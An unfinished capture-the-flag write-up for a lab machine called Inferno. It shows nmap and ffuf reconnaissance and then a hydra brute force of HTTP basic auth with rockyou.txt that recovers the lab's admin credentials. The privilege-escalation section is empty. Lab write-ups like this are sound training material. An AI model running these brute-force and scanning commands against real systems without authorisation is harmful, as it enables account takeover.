---
layout: default
title: Inferno
---

## TL;DR



### Recon

we start with `nmap`, using this command:
```bash
nmap inferno.thm --top-ports 10 -sVC
```

I've done that because it too much time to scan all ports, so I decided to check only the ten most popular ports.

![nmap results](image-4.png)

As we can see, port `22` is open with ssh, and port `80` with apache http server.
The title is `Dante's Inferno`.

```bash
PORT     STATE  SERVICE       VERSION
21/tcp   open   ftp?
22/tcp   open   ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 15:22:c1:42:c6:d9:e9:50:9a:e6:c5:68:7d:0b:e2:a0 (RSA)
|   256 1e:6d:d4:8f:77:78:3c:f0:43:60:9a:bd:1e:c8:62:68 (ECDSA)
|_  256 e5:34:c6:42:f5:85:9b:1a:25:bf:0b:77:dc:f2:90:b5 (ED25519)
23/tcp   open   telnet?
25/tcp   open   smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open   http          Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dante's Inferno
110/tcp  open   pop3?
139/tcp  closed netbios-ssn
443/tcp  open   https?
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
```

Let's add `inferno.thm` to our `/etc/hosts`.

### 

This is the root page. We can't find any subdomain, however, we do find interesting endpoint.

![root page](image-2.png)

When we use `ffuf` to enumerate the machine, we can find the endpoint `/inferno` which gives us `401`, Unauthorized.

```bash
┌──(agonen㉿kali)-[~/Inferno]                                                                                                            19:11:49 [1020/1172]
└─$ ffuf -u "http://inferno.thm/FUZZ" -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt                               
                                                                                                                                                             
        /'___\  /'___\           /'___\                                                                                                                      
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                      
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                     
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                     
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                      
          \/_/    \/_/   \/___/    \/_/                                                                                                                      
                                                                                                                                                             
       v2.1.0-dev                                                                                                                                            
________________________________________________                                                                                                             
                                                                                                                                                             
 :: Method           : GET                                                                                                                                   
 :: URL              : http://inferno.thm/FUZZ                                                                                                               
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt                                           
 :: Follow redirects : false                                                                                                                                 
 :: Calibration      : false                                                                                                                                 
 :: Timeout          : 10                                                                                                                                    
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

inferno                 [Status: 401, Size: 458, Words: 42, Lines: 15, Duration: 94ms]
                        [Status: 200, Size: 638, Words: 63, Lines: 37, Duration: 97ms]
```

![ffuf results](image.png)

When we go to this point, we can see it requires password.

![requires password](image-1.png)

Now, we can build list of possible usernames, and then brute force the password, because this is basic auth.

```bash
admin
inferno
dante
test
user
root
```

using `hydra` we managed to find set of credentials working. 

```bash
┌──(agonen㉿kali)-[~/thm/Inferno]
└─$ hydra -I -L users.txt -P /usr/share/wordlists/rockyou.txt "http-get://inferno.thm/inferno"     
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-18 23:00:59
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 86066394 login tries (l:6/p:14344399), ~5379150 tries per task
[DATA] attacking http-get://inferno.thm:80/inferno
[STATUS] 2683.00 tries/min, 2683 tries in 00:01h, 86063711 to do in 534:38h, 16 active
[STATUS] 2767.67 tries/min, 8303 tries in 00:03h, 86058091 to do in 518:15h, 16 active
[80][http-get] host: inferno.thm   login: admin   password: dante1
```

![hydra](image-3.png)

Now, we can login with these set of credentials:
```bash
admin:dante1
```

### Privilege Escalation to Root


